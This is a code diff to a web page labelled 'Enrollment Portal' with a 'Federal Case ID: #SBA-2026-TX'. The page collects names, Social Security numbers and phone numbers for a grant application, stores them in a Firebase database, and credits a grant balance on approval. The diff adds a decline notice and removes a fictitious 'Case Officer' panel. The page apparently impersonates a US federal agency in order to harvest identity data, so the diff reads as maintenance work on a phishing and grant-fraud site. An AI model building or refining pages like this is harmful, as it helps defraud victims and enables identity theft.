@@ -68,6 +68,11 @@
         <div class="form-card p-6">
             
             <div id="applyForm" class="hidden">
+                <div id="declineNotice" class="hidden mb-6 p-4 bg-rose-50 border-l-4 border-rose-500 rounded">
+                    <p class="text-[10px] font-black text-rose-600 uppercase">Application Declined</p>
+                    <p id="declineReason" class="text-xs font-bold text-rose-800 mt-1"></p>
+                </div>
+
                 <div class="mb-6 border-b pb-4">
                     <h1 class="text-xl font-extrabold text-slate-800">Enrollment Portal</h1>
                     <p class="text-[10px] text-slate-400 font-bold uppercase">Federal Case ID: #SBA-2026-TX</p>
@@ -110,15 +115,6 @@
                 </div>
 
                 <button onclick="submitData()" id="subBtn" class="btn-submit">Certify & Submit</button>
-
-                <div class="mt-10 pt-6 border-t flex items-center gap-4">
-                    <div class="w-10 h-10 bg-slate-100 rounded-full flex items-center justify-center text-blue-900 border"><i class="fas fa-user-check"></i></div>
-                    <div>
-                        <p class="text-[9px] font-extrabold text-slate-400 uppercase">Case Officer</p>
-                        <h4 class="text-sm font-extrabold text-slate-800">Serah Miller</h4>
-                        <a href="support.html" class="text-[10px] text-blue-600 font-bold uppercase">Open Support Chat</a>
-                    </div>
-                </div>
             </div>
 
             <div id="pendingView" class="hidden py-16 text-center">
@@ -155,7 +151,6 @@
                 if (d.applyStatus === "APPROVED" || d.applyStatus === "SUCCESSFUL") {
                     document.getElementById('successView').classList.remove('hidden');
                     
-                    // AUTO-CREDIT ONLY ONCE
                     if (d.lastAppliedAmount > 0 && d.grantCredited === false) {
                         try {
                             await updateDoc(doc(db, "users", user.uid), {
@@ -168,10 +163,13 @@
                 else if (d.applyStatus === "PENDING") {
                     document.getElementById('pendingView').classList.remove('hidden');
                 } 
+                else if (d.applyStatus === "DECLINED") {
+                    document.getElementById('applyForm').classList.remove('hidden');
+                    document.getElementById('declineNotice').classList.remove('hidden');
+                    document.getElementById('declineReason').innerText = d.applyDeclineReason || "Information verification failed.";
+                }
                 else {
                     document.getElementById('applyForm').classList.remove('hidden');
-                    // Pre-fill name if exists
-                    if(d.fullName) document.getElementById('fullName').value = d.fullName;
                 }
             });
         });
@@ -179,10 +177,9 @@
         window.submitData = async () => {
             const btn = document.getElementById('subBtn');
             const amount = Number(document.getElementById('reqAmount').value);
-            
-            // Simple Validation
             const name = document.getElementById('fullName').value;
             const ssn = document.getElementById('ssn').value;
+
             if(!name || !ssn) { alert("Please complete all identity fields."); return; }
 
             btn.innerText = "Processing..."; btn.disabled = true;
@@ -200,10 +197,10 @@
                     phone: document.getElementById('phone').value,
                     lastAppliedAmount: amount,
                     grantCredited: false,
-                    submittedAt: new Date().toLocaleString()
+                    submittedAt: new Date().toISOString()
                 });
             } catch (e) {
-                alert("Submission failed. Check your connection.");
+                alert("Submission failed.");
                 btn.disabled = false; btn.innerText = "Certify & Submit";
             }
         };
